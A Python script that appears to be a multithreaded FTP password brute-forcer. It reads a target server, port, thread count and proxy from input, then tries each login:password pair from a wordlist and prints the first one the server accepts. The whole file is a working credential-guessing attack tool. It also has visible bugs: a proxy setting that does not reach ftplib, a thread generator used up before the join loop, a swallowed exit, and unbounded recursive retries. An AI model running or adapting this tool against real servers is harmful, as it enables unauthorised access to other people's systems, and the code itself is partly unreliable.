import os
import ftplib
import threading as Th
import urllib.request as ur

try:
    inp = input("ftpcr>").split()
except KeyboardInterrupt:
    print("Bye!")
    raise SystemExit

print(inp)
port = 2221
th_num = 5
server = inp[0]
if "-th" in inp:
    try:
        th_num = int(inp[inp.index("-th") + 1])
    except ValueError:
        print("You didn't write threads number")
        raise SystemExit
if "-p" in inp:
    try:
        port = int(inp[inp.index("-p") + 1])
    except ValueError:
        print("You didn't write port number")
        raise SystemExit
if "-pr" in inp:
    ur.install_opener(ur.build_opener(
        ur.ProxyHandler({
            inp[inp.index("-pr") + 1].split(";")[0]: inp[inp.index("-pr") + 1].split(";")[1]})))
try:
    filepass = open(inp[1], "r")
except IndexError:
    print("File not found!")
    raise SystemExit


def simple_connection(server, port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host=server, port=port)
        ftp.quit()
        print("This ftp-server doesn't have a password and login")
        raise SystemExit
    except:
        pass

def connect(login, password, port, server):
    try:
        ft = ftplib.FTP()
        ft.connect(host=server, port=port)
        ft.login(user=login, passwd=password)
        ft.quit()
        print("\nDONE!\n\t Login - ", login + "\n", "\tPassword -", password)
        os._exit(0)
    except ftplib.error_perm:
        print(login, ":", password, "- [-]")

    except ConnectionRefusedError:
        print("[E] The destination computer "
              "rejected the connection re"
              "quest.")
    except TimeoutError:
        print("[E] The program can't connect to "
              "the server!")
    except Exception as e:
        print("[E]", e)
        connect(login, password, port, server)


def func(port, filepass):
    for line in filepass:
        login = line.split(":")[0]
        password = line.split(":")[1].replace("\n", "")
        connect(login, password, port, server)


if __name__ == '__main__':
    print("[I] START")
    simple_connection(server, port)
    th = (Th.Thread(target=func, args=[port, filepass]) for i in range(th_num))
    for t in th:
        t.start()
    for t in th:
        t.join()